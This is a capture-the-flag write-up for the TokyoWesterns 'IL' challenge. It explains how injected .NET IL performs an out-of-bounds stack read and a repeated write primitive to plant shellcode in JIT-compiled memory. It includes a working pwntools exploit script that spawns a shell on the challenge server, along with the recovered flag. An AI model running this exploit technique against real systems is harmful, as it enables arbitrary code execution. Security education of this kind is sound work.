# IL

For this task, we get a zip-file with a binary and multiple DLL's. The binary just seems to invoke `il.dll`, which does the following:

```c#
private static void Main(string[] args)
{
	try
	{
		Console.WriteLine("send me your spell:");
		Console.Out.Flush();
		byte[] array = Convert.FromBase64String(Console.ReadLine().Trim());
		if (array.Length > 2035)
		{
			Console.WriteLine("hey your spell is way too long!");
			Console.Out.Flush();
		}
		else
		{
			Console.WriteLine("okay, let's see what happens...");
			Console.Out.Flush();
			using (MemoryStream memoryStream = new MemoryStream(File.ReadAllBytes(Path.Join(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "ilstub.dll"))))
			{
				memoryStream.Seek(604L, SeekOrigin.Begin);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(new byte[2035 - array.Length], 0, 2035 - array.Length);
				memoryStream.WriteByte(42);
				MethodInfo method = Assembly.Load(memoryStream.ToArray()).GetType("ILStub.Stub").GetMethod("Func", BindingFlags.Static | BindingFlags.Public);
				Console.WriteLine("result=0x{0:x}", method.Invoke(null, new object[]
				{
					4919UL
				}));
				Console.Out.Flush();
			}
			Console.WriteLine("well done! see you next time!");
			Console.Out.Flush();
		}
	}
	catch (Exception ex)
	{
		Console.WriteLine("sorry but something went wrong...");
		Console.WriteLine(ex.ToString());
		Console.Out.Flush();
	}
}

```

It reads `ilstub.dll`, replaces a part of it with whatever it receives on stdin, and then calls a function. As it turns out, the place where it starts writing into the binary is at the start of that function:

```c#
public static ulong Func(ulong arg)
{
	arg ^= 1UL;
	arg ^= 1UL;
    // ...
	arg ^= 1UL;
	return arg;
}
```

This means we can supply abritrary dotnet IL, which then directly gets executed by the program. In order to exploit this, we modified the bytecode of `Func` using dnSpy in the following way:

```c#
public unsafe static ulong Func(ulong arg)
{
	arg ^= 1UL;
	arg ^= 1UL;

    // preamble
	long num = *(stackalloc byte[16] + 1094795585 /* 0x41414141 */);
    
    // write primitive
	*num = 4774451407313060418L /* 0x4242424242424242 */;
	long num2 = num + 8L;

	arg ^= 1UL;
	arg ^= 1UL;
    //...
  	arg ^= 1UL;
	return arg;
}
```

This uses a stack-allocated array to achieve an out-of-bound read on the stack (adding the offset `0x41414141` to wherever the array is on the stack). We use this to get the return address of the function, which will point into an rwx page since dotnet IL gets JIT-compiled. We then use the write primitive over and over again to write an x86-64 shellcode at that return address, which will then get executed after `Func` returns.

For this, we use the following python script to read this function from our modified `ilstub.dll`, replace the `0x41414141` with the correct offset and then repeat the write primitive for every 8-byte chunk of the shellcode where we replace the `0x4242424242424242`:

```python
from pwn import *
from base64 import b64encode

context.arch = 'amd64'

with open('ilstub-cpy.dll', 'rb') as f:
    func = f.read()[612: 612 + 0x2B]

preamble = func[0: 0x1E].replace(b'\x41' * 8, p64(32))
write_primitive = func[0x1E:]

shellcode = group(8, asm(shellcraft.amd64.linux.sh()))

exploit = preamble[:]
for block in shellcode:
    exploit += write_primitive.replace(b'\x42' * 8, bytes(block).ljust(8, b'\x90'))

if args.REMOTE:
    p = remote('pwn02.chal.ctf.westerns.tokyo', 23541)
else:
    p = process('./il')
p.sendlineafter(b'spell:\n', b64encode(exploit))
p.interactive()

```

We use a shellcode that will just pop a shell. After getting the shell, it's just a matter of `cat`ing `flag.txt`: 
`TWCTF{0n3_brINgS_5h4d0W_0nE_BRIng5_LighT}`